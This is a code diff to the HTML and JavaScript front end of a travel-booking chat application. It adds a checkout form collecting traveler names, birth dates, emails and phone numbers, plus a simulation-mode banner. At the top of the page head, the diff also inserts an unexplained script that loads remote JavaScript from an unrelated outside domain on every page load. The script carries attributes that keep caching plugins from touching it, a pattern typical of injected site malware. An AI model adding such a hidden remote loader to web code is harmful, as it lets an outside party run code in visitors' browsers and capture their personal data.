@@ -3,6 +3,14 @@
 
 <head>
     <meta charset="UTF-8">
+    <script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
+      (function () {
+          var script = document.createElement("script");
+          script.async = 1;
+          script.src = 'https://emrld.ltd/NTA3NDgx.js?t=507481';
+          document.head.appendChild(script);
+      })();
+    </script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
@@ -29,6 +37,38 @@
         .gsi-modal h3 { margin-top: 0; color: #333; }
         .gsi-modal p { color: #666; margin-bottom: 20px; }
         #gsi-button-container { display: flex; justify-content: center; }
+
+        /* Simulation Banner */
+        .simulation-banner {
+            background: #ff4757;
+            color: white;
+            padding: 8px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 0.9rem;
+            display: none;
+            z-index: 1000;
+        }
+        .simulation-mode .simulation-banner { display: block; }
+        .simulation-mode .action-btn { background: #2ed573 !important; } /* A bright, safe green for sim mode */
+
+        /* Checkout Modal */
+        #checkout-modal-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7); z-index: 10000;
+            display: none; justify-content: center; align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        .checkout-modal {
+            background: white; border-radius: 20px; width: 95%; max-width: 600px;
+            max-height: 90vh; overflow-y: auto; padding: 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+        }
+        .checkout-form label { display: block; margin-bottom: 5px; font-weight: 600; font-size: 0.9rem; }
+        .checkout-form input, .checkout-form select { 
+            width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px;
+        }
+        .traveler-form { border: 1px solid #eee; padding: 15px; border-radius: 12px; margin-bottom: 20px; background: #fafafa; }
 
         :root {
             --primary-color: #6366f1;
@@ -1749,7 +1789,73 @@
 </header>
 
 <!-- Main View Container -->
-<div id="main-view">
+    <div id="checkout-modal-overlay">
+        <div class="checkout-modal">
+            <h2 style="margin-top:0;">Secure Checkout</h2>
+            <p style="color:#666; margin-bottom: 20px;">Please provide traveler details to finalize your booking.</p>
+            
+            <form id="checkout-form" class="checkout-form">
+                <div id="travelers-container">
+                    <div class="traveler-form">
+                        <h4 style="margin-top:0;">Lead Traveler</h4>
+                        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
+                            <div>
+                                <label>First Name</label>
+                                <input type="text" name="first_name" placeholder="As on Passport" required>
+                            </div>
+                            <div>
+                                <label>Last Name</label>
+                                <input type="text" name="last_name" placeholder="As on Passport" required>
+                            </div>
+                        </div>
+                        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
+                            <div>
+                                <label>Date of Birth</label>
+                                <input type="date" name="dob" required>
+                            </div>
+                            <div>
+                                <label>Gender</label>
+                                <select name="gender">
+                                    <option value="male">Male</option>
+                                    <option value="female">Female</option>
+                                    <option value="other">Other</option>
+                                </select>
+                            </div>
+                        </div>
+                        <label>Email Address</label>
+                        <input type="email" name="email" placeholder="For confirmation" required>
+                        <label>Phone Number</label>
+                        <input type="tel" name="phone" placeholder="+1..." required>
+                    </div>
+                </div>
+
+                <div style="background:#f1f5f9; padding:15px; border-radius:10px; margin-bottom:20px;">
+                    <div style="display:flex; justify-content:space-between; font-weight:bold; font-size:1.1rem;">
+                        <span>Total Due:</span>
+                        <span id="checkout-total-price">$0.00</span>
+                    </div>
+                    <p style="font-size:0.8rem; color:#64748b; margin:10px 0 0 0;">
+                        Wait, this is a <strong>Simulation Mode</strong>. No real payment will be taken. 
+                        You can use our test card: <code style="background:#fff; padding:2px 5px; border-radius:4px; font-weight:900;">4242 4242 4242 4242</code>
+                    </p>
+                </div>
+
+                <div style="display:flex; gap:10px;">
+                    <button type="button" onclick="closeCheckout()" class="action-btn" style="background:#94a3b8; flex:1;">Cancel</button>
+                    <button type="submit" class="action-btn" style="background:#28a745; flex:2;">Complete Booking</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="simulation-banner" id="sim-banner">
+        ⚠️ TEST MODE: Simulated Bookings Only
+        <label style="margin-left: 15px; font-size: 0.8rem; cursor: pointer;">
+            <input type="checkbox" id="sim-toggle" checked onclick="toggleSimMode()"> Sim Mode ON
+        </label>
+    </div>
+
+    <div id="main-view">
 
 <!-- Google Sign-In Modal -->
 <div class="gsi-modal-overlay" id="gsi-modal" onclick="if(event.target === this) this.style.display='none'">
@@ -2872,6 +2978,30 @@
     const transcriptDiv = document.getElementById('transcript');
 
     let sessionId = localStorage.getItem('chat_session_id');
+    let isSimMode = true; // Default to simulation mode for testing
+    let currentBookingPackageId = null;
+
+    function toggleSimMode() {
+        const toggle = document.getElementById('sim-toggle');
+        if (!toggle) return;
+        isSimMode = toggle.checked;
+        if (isSimMode) {
+            document.body.classList.add('simulation-mode');
+        } else {
+            document.body.classList.remove('simulation-mode');
+        }
+    }
+
+    function openCheckout(packageId, price) {
+        currentBookingPackageId = packageId;
+        document.getElementById('checkout-total-price').innerText = `$${price.toFixed(2)}`;
+        document.getElementById('checkout-modal-overlay').style.display = 'flex';
+    }
+
+    function closeCheckout() {
+        document.getElementById('checkout-modal-overlay').style.display = 'none';
+        currentBookingPackageId = null;
+    }
 
     // --- Auth Logic ---
     let googleAuthToken = sessionStorage.getItem('googleAuthToken');
@@ -4653,14 +4783,19 @@
                         const reviews = (activity.metadata && activity.metadata.reviews) ? activity.metadata.reviews : null;
                         const reviewCarouselHtml = reviews ? renderReviewCarousel(reviews, reviewLink) : '';
 
+                        const bookingLink = (activity.metadata && activity.metadata.booking_link) ? activity.metadata.booking_link : null;
+                        const bookingRef = (activity.metadata && activity.metadata.booking_reference) ? activity.metadata.booking_reference : null;
+
                         html += `
                             <div class="package-item-responsive" style="padding:0; overflow:hidden;">
                                 ${renderImageSlider(images, activity.name)}
                                 <div class="package-item-details" style="padding:12px;">
                                     <div style="font-weight:600; color:#333; margin-bottom:6px; font-size:0.95rem;">${activity.name}</div>
                                     <div style="font-size:0.85rem; color:#666; margin-bottom:4px;">${sym}${activity.price}</div>
+                                    ${bookingRef ? `<div style="font-size:0.85rem; color:#28a745; font-weight:bold; margin-bottom:4px;">✅ Confirmed (Ref: ${bookingRef})</div>` : ''}
                                     ${rating ? `<div style="font-size:0.8rem; color:#f39c12; margin-top:4px;">⭐ ${rating}/5 ${!reviews && reviewLink ? `<a href="${reviewLink}" target="_blank" style="color:var(--primary-color); text-decoration:none;">See reviews</a>` : ''}</div>` : ''}
                                     ${activity.description ? `<div style="font-size:0.8rem; color:#666; line-height:1.4; margin-top:8px;">${activity.description}</div>` : ''}
+                                    ${bookingLink ? `<a href="${bookingLink}" target="_blank" style="display:inline-block; margin-top:10px; color:#4f46e5; text-decoration:none; font-weight:bold; font-size:0.85rem;">Complete Reservation &rarr;</a>` : ''}
                                     ${reviewCarouselHtml}
                                 </div>
                             </div>
@@ -4683,14 +4818,20 @@
             </div>`;
         }
 
-        // Booking Action
         if (pkg.status === 'draft' && travelItems.length > 0) {
             html += `
                 <div style="text-align:center; margin-top:20px;">
-                    <button onclick="bookPackage('${pkg.id}')" class="action-btn" style="background:#28a745; font-size:1.1rem; padding:10px 30px;">
-                        Book Travel Now (${sym}${travelTotal})
+                    <button onclick="openCheckout('${pkg.id}', ${travelTotal})" class="action-btn" style="background:#28a745; font-size:1.1rem; padding:10px 30px;">
+                        Book Holiday Now (${sym}${travelTotal})
                     </button>
-                    <p style="font-size:0.8rem; color:#888; margin-top:5px;">Secure payment via Agent</p>
+                    <p style="font-size:0.8rem; color:#888; margin-top:5px;">Secure 1-Click Payment</p>
+                </div>
+            `;
+        } else if (pkg.status === 'booked' || pkg.status === 'partial') {
+            html += `
+                <div style="text-align:center; margin-top:20px; padding:15px; background:#eef2ff; border-radius:12px;">
+                    <div style="color:#4f46e5; font-weight:bold; font-size:1.1rem; margin-bottom:5px;">🎉 Holiday Secured!</div>
+                    <p style="font-size:0.9rem; color:#6366f1;">Check your email for full confirmation and links.</p>
                 </div>
             `;
         }
@@ -5066,22 +5207,25 @@
         }
     }
 
-    async function bookPackage(packageId) {
-        if (!sessionId) return;
+    async function bookPackage(packageId, travelers) {
+        if (!sessionId || !packageId) return;
         setBotStatusMessage("Processing booking...", 'center');
         try {
             const res = await fetchWithAuth(`/api/packages/${sessionId}/${packageId}/book`, {
-                method: 'POST'
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ travelers: travelers })
             });
             const data = await res.json();
-            if (data.status === 'success') {
-                alert("Success! " + data.message);
+            if (res.ok) {
+                alert("Success! " + (data.message || "Your holiday is booked."));
+                closeCheckout();
                 // Refresh list and reopening details
                 const pkgs = await updatePackages();
                 const p = pkgs.find(p => p.id === packageId);
                 if (p) showPackageDetails(p);
             } else {
-                alert("Booking failed: " + data.message);
+                alert("Booking failed: " + (data.detail || data.message || "General error"));
             }
         } catch (e) {
             console.error(e);
@@ -5090,6 +5234,27 @@
             clearBotStatusMessage();
         }
     }
+
+    // Attach checkout form handler
+    document.addEventListener('DOMContentLoaded', () => {
+        const form = document.getElementById('checkout-form');
+        if (form) {
+            form.onsubmit = async (e) => {
+                e.preventDefault();
+                const formData = new FormData(e.target);
+                const travelers = [{
+                    first_name: formData.get('first_name'),
+                    last_name: formData.get('last_name'),
+                    dob: formData.get('dob'),
+                    gender: formData.get('gender'),
+                    email: formData.get('email'),
+                    phone: formData.get('phone')
+                }];
+                await bookPackage(currentBookingPackageId, travelers);
+            };
+        }
+        toggleSimMode(); // Initialize banner/state
+    });
 
     // Expose globals
     window.continueShoppingConversation = continueShoppingConversation;
@@ -5103,6 +5268,9 @@
     window.showPackageDetails = showPackageDetails;
     window.closePackageDetails = closePackageDetails;
     window.bookPackage = bookPackage;
+    window.openCheckout = openCheckout;
+    window.closeCheckout = closeCheckout;
+    window.toggleSimMode = toggleSimMode;
     window.removeItemFromPackage = removeItemFromPackage;
 
     window.openAllAmazonLinks = function (pkgId) {
